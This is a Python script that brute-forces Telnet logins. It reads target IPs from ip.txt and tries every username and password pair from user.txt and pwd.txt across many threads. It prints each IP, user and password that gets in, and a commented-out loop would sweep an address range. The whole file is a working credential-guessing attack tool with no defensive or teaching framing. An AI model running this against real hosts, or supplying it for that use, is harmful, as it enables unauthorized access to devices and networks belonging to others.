import telnetlib;
import time;
import threading;

def connectTelnet(ip,user,pwd):
	if ip.split(".")[3]=="254":
		print(ip);
	tn = telnetlib.Telnet(ip,timeout=20);
	tn.set_debuglevel(0);
	#print("logining: " + ip);
	a = tn.expect([b"login",b"Login",b"name"],timeout=20);
	#print(a)
	ipFile = open("ip.txt","a");
	ipFile.write(ip+"\n");
	tn.write(user+b"\r\n");
	tn.expect([b"word"],timeout=20);
	tn.write(pwd+b"\r\n");
	tn.write(b"\r\n");
	#print(tn.read_until(b'Domain name:'));
	'''
	result = tn.read_some();
	try:
		result = result + tn.read_some();
		result = result + tn.read_some();
	
	except Exception as e:
		pass;
	print(result)
	'''
	
	res = tn.expect([b'Failed',b'failed',b'invalid',b'incorrect'],timeout=20);
	#print(res);
	if res[0]>=0:
		pass;
		#print("login failed");
	else:
		print(b"login success!");
		print(b"ip:"+str(ip).encode("utf-8")+b" / user:"+user+b" / pwd:"+pwd);
	tn.close();

def dfs(ip):
	
		userLines = open(b"user.txt").read().split("\n");
		for user in userLines:
			pwdLines = open(b"pwd.txt").read().split("\n");
			for pwd in pwdLines:
				try:
					connectTelnet(ip,user.encode("utf-8"),pwd.encode("utf-8"));
				except:
					pass;
				time.sleep(0.02);
	
'''
for ip1 in range(202,203):
	for ip2 in range(3,4):
		for ip3 in range(29,30):
			for ip4 in range(1,2):
				t=threading.Thread(target=dfs,name='runThread',args=(str(ip1)+"."+str(ip2)+"."+str(ip3)+"."+str(ip4),));
				t.start()
'''
ipLines = open(b"ip.txt").read().split("\n");
for ip in ipLines:
	t=threading.Thread(target=dfs,name='runThread',args=(ip,));
	t.start()


